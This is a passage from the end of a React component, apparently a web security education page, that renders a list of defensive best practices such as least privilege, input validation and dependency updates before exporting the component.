                                            <h4 className="text-white font-bold mb-1">Defense in Depth</h4>
                                            <p className="text-sm text-gray-400">Implement multiple layers of security controls. If one fails, others provide redundancy.</p>
                                        </div>
                                    </div>
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
                                            <h4 className="text-white font-bold mb-1">Least Privilege</h4>
                                            <p className="text-sm text-gray-400">Grant users and services only the minimum level of access necessary to perform their required tasks.</p>
                                        </div>
                                    </div>
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
                                            <h4 className="text-white font-bold mb-1">Secure by Default</h4>
                                            <p className="text-sm text-gray-400">The default configuration of any system or framework should be the most secure option.</p>
                                        </div>
                                    </div>
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
                                            <h4 className="text-white font-bold mb-1">Never Trust User Input</h4>
                                            <p className="text-sm text-gray-400">All input must be validated, sanitized, and type-checked on the server-side before processing.</p>
                                        </div>
                                    </div>
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
                                            <h4 className="text-white font-bold mb-1">Logging & Monitoring</h4>
                                            <p className="text-sm text-gray-400">Ensure comprehensive logging of security events (login failures, access control failures) to detect and respond to breaches.</p>
                                        </div>
                                    </div>
                                    <div className="flex gap-3">
                                        <ShieldCheck className="w-6 h-6 text-emerald-400 shrink-0 mt-1" />
                                        <div>
                                            <h4 className="text-white font-bold mb-1">Keep Dependencies Updated</h4>
                                            <p className="text-sm text-gray-400">Regularly scan and update third-party libraries to patch known vulnerabilities (CVEs).</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </motion.section>

                    </motion.div>
                </div>
            </div>
        </>
    );
};

export default WebSecurityVulnerabilities;
